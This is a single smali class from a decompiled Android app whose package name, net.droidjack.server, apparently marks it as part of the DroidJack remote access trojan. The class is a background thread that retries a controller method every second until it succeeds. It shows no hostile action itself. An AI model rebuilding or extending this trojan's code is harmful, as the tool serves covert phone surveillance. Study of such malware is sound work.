.class Lnet/droidjack/server/x;
.super Ljava/lang/Thread;


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    sget-boolean v0, Lnet/droidjack/server/Controller;->x:Z

    if-nez v0, :cond_0

    invoke-static {}, Lnet/droidjack/server/Controller;->c()Z

    move-result v0

    if-eqz v0, :cond_0

    :goto_0
    invoke-static {}, Lnet/droidjack/server/Controller;->f()Z

    move-result v0

    if-eqz v0, :cond_1

    const/4 v0, 0x1

    sput-boolean v0, Lnet/droidjack/server/Controller;->x:Z

    :cond_0
    return-void

    :cond_1
    const-wide/16 v0, 0x3e8

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_0
.end method
